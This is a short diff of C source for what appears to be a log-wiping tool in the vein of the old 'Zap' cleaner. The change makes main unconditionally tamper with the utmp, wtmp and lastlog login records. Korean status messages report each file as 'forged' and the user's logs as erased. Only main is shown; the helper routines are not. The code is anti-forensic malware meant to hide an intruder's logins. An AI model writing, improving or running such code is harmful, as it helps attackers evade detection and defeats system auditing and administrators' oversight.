@@ -52,24 +52,22 @@ int main(int argc,char *argv[])
         }
     }
 
-    if(AFlag==1){
-        if(kill_tmp("/var/run/utmpx")==-1) return 0;
-        if(kill_lastlog("/var/log/lastlog")==-1) return 0;
-        printf("%s의 로그를 지웠습니다\n",username1);
-    }else if(aFlag==1){
-        if(kill_tmp("/var/run/utmp")==-1) return -1;
-    }else if(RFlag==1){
+    if(kill_tmp("/var/run/utmp")==-1){
+        return 0;
+    }else{
+        printf("utmp파일 위조 완료\n");
     }
-
+    if(kill_tmp("/var/log/wtmp")==-1){
+        return 0;
+    }else{
+        printf("wtmp파일 위조 완료\n");
+    }
+    if(kill_lastlog("/var/log/lastlog")==-1){
+        return 0;
+    }else{
+        printf("lastlog파일 위조 성공\n");
+    }
+    printf("%s의 로그지우기 성공\n",username1);
     
-
-    // if (argc==2) {
-    //     kill_tmp("/etc/utmp",argv[1]);
-    //     kill_tmp("/usr/adm/wtmp",argv[1]);
-    //     kill_lastlog(argv[1]);
-    //     printf("Zap!\n");
-    // } else
-    // printf("Error.\n");
-
     return 0;
 }
